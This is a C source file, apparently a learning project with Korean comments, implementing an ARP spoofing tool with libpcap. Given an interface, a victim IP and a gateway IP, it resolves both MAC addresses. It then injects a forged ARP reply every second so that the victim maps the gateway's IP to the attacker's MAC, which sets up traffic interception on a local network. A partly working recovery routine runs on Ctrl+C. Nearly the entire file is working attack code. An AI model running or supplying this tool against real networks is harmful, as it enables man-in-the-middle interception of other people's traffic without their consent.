#include <stdio.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <unistd.h>
#include <signal.h>
#include "arplib.h"

#define MACADDR_LEN 6
#define ERRBUF_SIZE 4096
#define ETH_HDR_SIZE 14
#define ARP_HDR_SIZE 28

void print_error(int8_t *errorPoint, int8_t *errorBuf);
void GetMyIP(__uint32_t *myIP, __uint8_t *interface);
void GetMyMac(uint8_t *MacAddr, uint8_t *interface);
void make_ether_header(struct ether_header *ether_header, uint8_t *dest, uint8_t *source, uint16_t type);
void make_arp_header(struct ether_arp *ether_arp, uint8_t *sha, uint32_t spa, uint8_t *tha, uint32_t tpa, uint32_t op);
void SendARP(pcap_t *packet_handle, uint8_t *srcMAC, uint8_t *dstMAC, uint32_t srcIP, uint8_t *dstIP, int ARPop);
uint32_t IsReply(const uint8_t *packet, uint32_t idstIP, uint8_t *dstMAC);
void sigintHandler(int sig);

__uint32_t myIP;
u_int8_t dev[20];
char errbuf[PCAP_ERRBUF_SIZE];
uint8_t AttackerMACAddr[MACADDR_LEN];
uint8_t VictimMACAddr[MACADDR_LEN];
uint8_t GateWayMACAddr[MACADDR_LEN];
pcap_t *packet_handle;
uint8_t *victimIP;
uint32_t gatewayIP;

/************************
* ARP Spoofing, Recovery
*************************/

int main(int argc, char **argv)
{
    if (argc != 4) {
        printf("usage : send_arp <network interface> <victim ip> <gateway ip>\n");
        exit(1);
    }

    memset(dev, 0, sizeof(dev));
    strcpy(dev, argv[1]);
    printf("network interface : %s\n", dev);
    if (dev == NULL) print_error("couldn't find device", errbuf);

    GetMyIP(&myIP, dev);
    GetMyMac(AttackerMACAddr, dev);

    packet_handle = pcap_open_live(dev, ERRBUF_SIZE, 1, 200, errbuf); // packet handle, maximum 4096 bytes, 200 ms time limit
    if (packet_handle == NULL) print_error("cannot get packet handle", errbuf);

    // 두 번째 인자 : Source Hardware Address
    // 세 번째 인자 : Destination Hardware Address
    // 네 번째 인자 : Source Protocol Address
    // 다섯 번째 인자 : Destination Protocol Address
    SendARP(packet_handle, AttackerMACAddr, GateWayMACAddr, myIP, argv[3], ARPOP_REQUEST);
    SendARP(packet_handle, AttackerMACAddr, VictimMACAddr, myIP, argv[2], ARPOP_REQUEST);
    
    // TODO : Fix ARP Recovery
    // ARP Recovery (Ctrl + C)
    gatewayIP = inet_addr(argv[3]);
    victimIP = argv[2];
    signal(SIGINT, sigintHandler);

    printf("ARP Spoofing...\n");
    // ARP Spoofing
    while (packet_handle) {
        // 두 번째 인자 : Source Hardware Address
        // 세 번째 인자 : Destination Hardware Address
        // 네 번째 인자 : Source Protocl Address
        // 다섯 번째 인자 : Destination Protocol Address
        // Source Hardware Address: Attacker MAC
        // Source Protocol Address: gateway IP
        // Destination Hardware Address: Victim MAC
        // Destination Protocol Address: Victim IP
        SendARP(packet_handle, AttackerMACAddr, VictimMACAddr, inet_addr(argv[3]), argv[2], ARPOP_REPLY);
        sleep(1);
    }
    
    pcap_close(packet_handle);
}

void print_error(int8_t *errorPoint, int8_t *errorBuf)
{
    if (errorBuf == NULL) fprintf(stderr, "<<<< %s >>>> \n", errorPoint);
    else fprintf(stderr, "<<<< %s >>>> \n%s", errorPoint, errorBuf);
    exit(1);
}

void GetMyIP(__uint32_t *myIP, __uint8_t *interface)
{
    struct ifreq ifr;
    char tmpIP[100];
    int s;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strncpy(ifr.ifr_name, interface, IF_NAMESIZE);

    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        print_error("failed in ioctl while getting my IP Addr", NULL);
    }
    else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, tmpIP, sizeof(struct sockaddr));
        printf("Attacker addr : %s\n", tmpIP);
        *myIP = inet_addr(tmpIP);
    }
}

void GetMyMac(uint8_t *MacAddr, uint8_t *interface)
{
    int nSD;
    struct ifreq sIfReq;
    struct if_nameindex *pIfList;

    pIfList = (struct if_nameindex *)NULL;

    if ((nSD = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
        print_error("Socket descriptor allocation failed\n", NULL);
    }

    pIfList = if_nameindex();
    for (; *(char*)pIfList != 0; pIfList++) {
        if (!strcmp(pIfList->if_name, interface)) {
            uint32_t a;
            strncpy(sIfReq.ifr_name, pIfList->if_name, IF_NAMESIZE);
            if (ioctl(nSD, SIOCGIFHWADDR, &sIfReq) != 0) {
                print_error("failed in ioctl while getting mac address\n", NULL);
            }
            memcpy(MacAddr, (&sIfReq.ifr_ifru.ifru_hwaddr.sa_data), 6);
            printf("Attacker MAC address : ");
            for (a = 0; a < 6; a = a + 1) {
                printf("%02X", MacAddr[a]);
                if (a < 5) putchar(':');
            }
            puts("");
        }
    }
}

void make_ether_header(struct ether_header *ether_header, uint8_t *dest, uint8_t *source, uint16_t type)
{
    memcpy(ether_header->ether_dhost, dest, 6);
    memcpy(ether_header->ether_shost, source, 6);

    ether_header->ether_type = htons(type);
}

void make_arp_header(struct ether_arp *ether_arp, uint8_t *sha, uint32_t spa, uint8_t *tha, uint32_t tpa, uint32_t op)
{
    ether_arp->arp_op = htons(op);
    ether_arp->arp_pro = ntohs(ETHERTYPE_IP);
    ether_arp->arp_hrd = ntohs(1);
    ether_arp->arp_hln = 6;
    ether_arp->arp_pln = 4;

    memcpy(ether_arp->arp_sha, sha, 6);
    ether_arp->arp_spa = spa;
    ether_arp->arp_tpa = tpa;

    if (tha != NULL) memcpy(ether_arp->arp_tha, tha, 6);
    else memset(ether_arp->arp_tha, 0x00, 6);
}

void SendARP(pcap_t *packet_handle, uint8_t *srcMAC, uint8_t *dstMAC, uint32_t srcIP, uint8_t *dstIP, int ARPop)
{
    struct arp_packet arpPacket;
    uint8_t BrdcastMAC[6] = "\xFF\xFF\xFF\xFF\xFF\xFF";
    uint8_t UnknownMAC[6] = "\x00\x00\x00\x00\x00\x00";
    uint32_t idstIP = inet_addr(dstIP);
    uint32_t *buf[ETH_HDR_SIZE + ARP_HDR_SIZE];

    make_ether_header(&(arpPacket.ether_header), (ARPop == ARPOP_REQUEST ? BrdcastMAC : dstMAC), srcMAC, ETHERTYPE_ARP);
    make_arp_header(&(arpPacket.ether_arp), srcMAC, srcIP, (ARPop == ARPOP_REQUEST ? UnknownMAC : dstMAC), idstIP, ARPop);

    memcpy(buf, &arpPacket, ETH_HDR_SIZE + ARP_HDR_SIZE);

    if (ARPop == ARPOP_REQUEST) {
        struct pcap_pkthdr *header;
        const u_int8_t *packet;
        uint32_t cnt = 0;
        pcap_inject(packet_handle, buf, ETH_HDR_SIZE + ARP_HDR_SIZE);
        while (1) {
            pcap_next_ex(packet_handle, &header, &packet);
            if (IsReply(packet, idstIP, dstMAC)) {
                int a;
                printf("MAC Address of %s ", dstIP);
                for (a = 0; a < 6; a = a + 1) {
                    printf("%02X", dstMAC[a]);
                    if (a < 5) putchar(':');
                }
                puts("");
                break;
            }
            cnt++;
            if (cnt == 10) {
                print_error("Cannot receive reply packet", NULL);
            }
        }
    }
    else pcap_inject(packet_handle, buf, ETH_HDR_SIZE + ARP_HDR_SIZE);
}

uint32_t IsReply(const uint8_t *packet, uint32_t idstIP, uint8_t *dstMAC)
{
    #define ARPOP_OFFSET 20
    #define PROTOCOLTYPE_OFFSET 12
    #define SRCIP_OFFSET 28
    #define SRC_MAC_OFFSET 6
    int a;
    if (packet[PROTOCOLTYPE_OFFSET] == 0x08 && packet[PROTOCOLTYPE_OFFSET + 1] == 0x06 && packet[ARPOP_OFFSET] == 0x00 && packet[ARPOP_OFFSET + 1] == 0x02 && !memcmp(&idstIP, packet + SRCIP_OFFSET, 4)) {
        for (a = 0; a < 6; a = a + 1) dstMAC[a] = packet[SRC_MAC_OFFSET + a];
        return 1;
    }
    else return 0;
}

// TODO : Fix ARP Recovery
void sigintHandler(int sig)
{
    signal(sig, SIG_IGN);
    printf(" ARP Spoofing Stop...\n");
    for (int i = 0; i < 25; i++) {
        // 두 번째 인자 : Source Hardware Address
        // 세 번째 인자 : Destination Hardware Address
        // 네 번째 인자 : Source Protocl Address
        // 다섯 번째 인자 : Destination Protocol Address
        // Source Hardware Address: gateway MAC
        // Source Protocol Address: gateway IP
        // Destination Hardware Address: victim MAC
        // Destination Protocol Address: victim IP
        SendARP(packet_handle, GateWayMACAddr, VictimMACAddr, gatewayIP, victimIP, ARPOP_REPLY);
        sleep(2);
    }
    printf("ARP Recovery...\n");
    exit(1);
}
